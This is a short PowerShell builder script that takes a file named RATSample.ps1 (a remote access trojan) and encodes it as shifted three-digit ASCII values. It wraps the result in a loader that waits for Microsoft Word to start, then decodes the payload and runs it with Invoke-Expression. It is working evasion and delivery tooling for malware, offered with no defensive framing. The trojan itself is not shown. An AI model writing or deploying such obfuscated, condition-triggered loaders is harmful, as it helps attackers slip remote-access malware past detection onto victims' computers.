$originalScript = Get-Content -Path "../RATSample.ps1" -Raw
$encryptedScript = ($originalScript.ToCharArray() | ForEach-Object {
        $asciiValue = [int][char]$_ + 1
        $asciiValue.ToString("D3")
    }) -join ''
$decryptionScript = @"
`$wordRunning = `$false
while (-not `$wordRunning) {
    if (Get-Process -Name "WINWORD" -ErrorAction SilentlyContinue) {
        `$wordRunning = `$true
    }else {
        Start-Sleep -Seconds 10
    }
}
`$encryptedScript = '$encryptedScript'
`$decryptedScript = ''
for (`$i = 0; `$i -lt `$encryptedScript.Length; `$i+=3) {
    `$asciiValue = [int]::Parse(`$encryptedScript.Substring(`$i, 3)) - 1
    `$decryptedScript += [char]`$asciiValue
}
Invoke-Expression `$decryptedScript
"@

$decryptionScript | Out-File -FilePath "ConditionTriggeredEncryptedRAT.ps1"
